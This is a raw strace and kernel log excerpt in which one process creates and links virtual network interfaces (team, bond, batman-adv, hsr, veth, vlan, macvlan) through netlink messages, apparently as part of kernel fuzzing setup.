[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x74\x65\x61\x6d\x5f\x73\x6c\x61\x76\x65\x5f\x30\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x74\x65\x61\x6d\x00\x00\x00&quot;], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x74\x65\x61\x6d\x5f\x73\x6c\x61\x76\x65\x5f\x31\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x74\x65\x61\x6d\x00\x00\x00&quot;], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;team_slave_0&quot;, ifr_ifindex=37}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;team0&quot;, ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[   75.995534][ T5086] bond0: (slave bond_slave_0): Enslaving as an active interface with an up link
[   76.013832][ T5086] bond0: (slave bond_slave_1): Enslaving as an active interface with an up link
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x10\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;team_slave_1&quot;, ifr_ifindex=39}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;team0&quot;, ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x10\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x61\x74\x61\x64\x76\x5f\x73\x6c\x61\x76\x65\x5f\x30\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x62\x61\x74\x61\x64\x76\x00&quot;], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x61\x74\x61\x64\x76\x5f\x73\x6c\x61\x76\x65\x5f\x31\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x62\x61\x74\x61\x64\x76\x00&quot;], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_0&quot;, ifr_ifindex=41}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv0&quot;, ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[   76.055161][ T5086] team0: Port device team_slave_0 added
[   76.070526][ T5086] team0: Port device team_slave_1 added
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x14\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_1&quot;, ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv0&quot;, ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[   76.106310][ T5086] batman_adv: batadv0: Adding interface: batadv_slave_0
[   76.114291][ T5086] batman_adv: batadv0: The MTU of interface batadv_slave_0 is too small (1500) to handle the transport of batman-adv packets. Packets going over this interface will be fragmented on layer2 which could impact the performance. Setting the MTU to 1560 would solve the problem.
[   76.141690][ T5086] batman_adv: batadv0: Not using interface batadv_slave_0 (retrying later): interface not active
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x14\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x09\x00\x03\x00\x78\x66\x72\x6d\x30\x00\x00\x00\x18\x00\x12\x00\x08\x00\x01\x00\x78\x66\x72\x6d\x0c\x00\x02\x00\x08\x00\x02\x00\x01\x00\x00\x00&quot;], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge_slave_0&quot;, ifr_ifindex=29}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge_slave_1&quot;, ifr_ifindex=31}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x03\x00\x68\x73\x72\x5f\x73\x6c\x61\x76\x65\x5f\x30\x00\x34\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x28\x00\x02\x00\x24\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x68\x73\x72&quot;], 100, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 100
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[   76.163613][ T5086] batman_adv: batadv0: Adding interface: batadv_slave_1
[   76.170738][ T5086] batman_adv: batadv0: The MTU of interface batadv_slave_1 is too small (1500) to handle the transport of batman-adv packets. Packets going over this interface will be fragmented on layer2 which could impact the performance. Setting the MTU to 1560 would solve the problem.
[   76.196727][ T5086] batman_adv: batadv0: Not using interface batadv_slave_1 (retrying later): interface not active
[pid  5086] sendto(3, [{nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x03\x00\x68\x73\x72\x5f\x73\x6c\x61\x76\x65\x5f\x31\x00\x34\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x28\x00\x02\x00\x24\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x68\x73\x72&quot;], 100, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 100
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;hsr_slave_0&quot;, ifr_ifindex=46}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;hsr_slave_1&quot;, ifr_ifindex=48}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=72, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x03\x00\x68\x73\x72\x30\x20\x00\x12\x00\x07\x00\x01\x00\x68\x73\x72\x00\x14\x00\x02\x00\x08\x00\x01\x00\x2e\x00\x00\x00\x08\x00\x02\x00\x30\x00\x00\x00&quot;], 72, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 72
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=72, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;hsr_slave_0&quot;, ifr_ifindex=46}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;hsr_slave_1&quot;, ifr_ifindex=48}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x00&quot;], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_virt_wifi&quot;, ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=76, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x30\x00\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x00\x00\x00\x08\x00\x05\x00\x32\x00\x00\x00&quot;], 76, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 76
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=76, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x76\x6c\x61\x6e\x00\x00\x34\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x28\x00\x02\x00\x24\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x76\x6c\x61\x6e\x00\x00&quot;], 100, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 100
[   76.258965][ T5086] hsr_slave_0: entered promiscuous mode
[   76.265164][ T5086] hsr_slave_1: entered promiscuous mode
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_vlan&quot;, ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x76\x6c\x61\x6e\x30\x00\x00\x00\x20\x00\x12\x00\x08\x00\x01\x00\x76\x6c\x61\x6e\x14\x00\x02\x00\x06\x00\x01\x00\x00\x00\x00\x00\x06\x00\x05\x00\x81\x00\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00&quot;], 84, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 84
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_vlan&quot;, ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x76\x6c\x61\x6e\x31\x00\x00\x00\x20\x00\x12\x00\x08\x00\x01\x00\x76\x6c\x61\x6e\x14\x00\x02\x00\x06\x00\x01\x00\x01\x00\x00\x00\x06\x00\x05\x00\x88\xa8\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00&quot;], 84, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 84
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_vlan&quot;, ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x03\x00\x6d\x61\x63\x76\x6c\x61\x6e\x30\x1c\x00\x12\x00\x0b\x00\x01\x00\x6d\x61\x63\x76\x6c\x61\x6e\x00\x0c\x00\x02\x00\x08\x00\x01\x00\x04\x00\x00\x00\x08\x00\x05\x00\x35\x00\x00\x00&quot;], 80, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 80
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_vlan&quot;, ifr_ifindex=53}) = 0
